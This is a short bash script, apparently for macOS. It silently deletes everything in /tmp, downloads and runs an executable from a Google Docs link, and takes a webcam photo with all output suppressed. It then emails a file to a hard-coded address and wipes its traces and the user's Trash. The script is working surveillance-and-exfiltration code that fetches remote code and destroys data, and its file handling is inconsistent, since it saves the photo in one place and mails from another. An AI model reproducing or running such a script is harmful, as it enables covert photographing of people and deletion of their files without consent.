#!/bin/bash

# Created by Austin Harshberger (2018)

# Temp to store filename
FILENAME=""

# Clear tmp
cd /tmp
rm -rf *

# Modify to be email the image should be sent to
EMAIL_TO_SEND="austin.harshberger@akqa.com"

# Download imagesnap
curl -o /tmp/imagesnap -O "https://doc-0k-48-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/c7l95rfv32agduavaqp2e37l5pcq1ubp/1534896000000/15087744746783275242/*/1TNj41PY66YT-3LxDJX4GY0PViDy_IO2E?e=download" > /dev/null 2>&1

# Make executable 
chmod u+x /tmp/imagesnap > /dev/null 2>&1

# Take a picture and store it in tmp
/tmp/imagesnap -w 1 ~/Desktop/test.jpg > /dev/null 2>&1

# List tmp
FILENAME="$(ls s*)"

# Email photo 
uuencode /tmp/$FILENAME $FILENAME | mail -s "photo of me" $EMAIL_TO_SEND > /dev/null 2>&1

# Delete photo 
rm -rf /tmp/$FILENAME > /dev/null 2>&1

# Delete imagesnap
rm -rf /tmp/imagesnap > /dev/null 2>&1

# Clear trash
rm -rf ~/.Trash*/ > /dev/null 2>&1
